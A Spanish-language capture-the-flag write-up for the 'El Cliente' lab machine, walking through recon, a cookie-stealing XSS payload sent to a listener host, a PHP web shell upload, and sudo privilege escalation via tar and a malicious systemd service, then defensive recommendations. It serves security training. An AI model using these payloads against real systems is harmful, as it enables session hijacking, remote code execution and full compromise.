📄 thl/elcliente.md
---
layout: default
title: El Cliente (THL)
---

# 🧠 Write-Up: El Cliente – thehackerslabs.com

---

## 🛰️ 1. Introducción

Este write-up documenta los hallazgos obtenidos durante una auditoría de ciberseguridad.  
Se detalla el proceso de reconocimiento, explotación y escalada de privilegios, proporcionando evidencia técnica y recomendaciones.

---

## 🔎 2. Reconocimiento y Escaneo Inicial

Escaneo de red:

```bash
nmap -sS -p- 192.168.182.0/24
````

Resultado:
Máquina identificada: 192.168.182.138
Puertos abiertos:

22/tcp → OpenSSH 9.6p1 Ubuntu

80/tcp → Apache 2.4.58

🌐 3. Enumeración del Sitio Web

Al acceder a http://192.168.182.138, encontramos una landing page con un formulario de contacto.

🔍 3.1 Fuzzing de Subdominios

Enumeración con wfuzz:

wfuzz -w subdominios.txt -u http://arka.thl -H "Host: FUZZ.arka.thl"


Resultado:

✅ Subdominio encontrado: admin.arka.thl
Interfaz de login en http://admin.arka.thl/login.php

💉 4. XSS y Secuestro de Sesión

Payload inyectado en el formulario de contacto:

<script>
new Image().src='http://192.168.182.134:4444/?cookie='+document.cookie
</script>


Servidor de escucha:

nc -lvnp 4444


La cookie fue interceptada exitosamente.
Usamos la cookie robada para autenticarnos en el panel de administración.

🐚 5. RCE mediante Carga de Archivos

El panel permite subir archivos. Subimos un web shell .phar.

Payload PHP:

<?php system($_GET['cmd']); ?>


Archivo accedido vía:

http://admin.arka.thl/uploads/shell.phar?cmd=id


Resultado: ejecución remota de comandos.

Obtuvimos una reverse shell y descubrimos las credenciales del usuario scott. Acceso SSH confirmado.

🚀 6. Escalada de Privilegios
🔐 6.1 De scott a kobe con tar
sudo -l


Resultado:

(scott) NOPASSWD: /bin/tar


Explotación:

sudo -u kobe tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash


Acceso como kobe obtenido.

👑 6.2 De kobe a root con systemctl

Permisos detectados:

sudo -l


Permitía uso de systemctl. Creamos servicio malicioso:

echo '[Service]
ExecStart=/bin/bash
[Install]
WantedBy=multi-user.target' > /tmp/backdoor.service


Instalación y ejecución:

sudo cp /tmp/backdoor.service /etc/systemd/system/backdoor.service
sudo systemctl daemon-reexec
sudo systemctl start backdoor


Resultado: root shell activa.

✅ 7. Conclusión

Comprometimos totalmente la máquina a través de múltiples vectores:

XSS y secuestro de sesión

RCE por subida de archivo

Escalada vía tar sin contraseña

Escalada a root con systemctl

🛡️ 8. Recomendaciones

Bloquear ejecución de archivos subidos

Aplicar HttpOnly y Secure en cookies

Validar y sanitizar toda entrada de usuario

Limitar privilegios de sudo, tar, y systemctl

⚠️ Este write-up es únicamente para fines educativos y de concienciación sobre seguridad ofensiva.
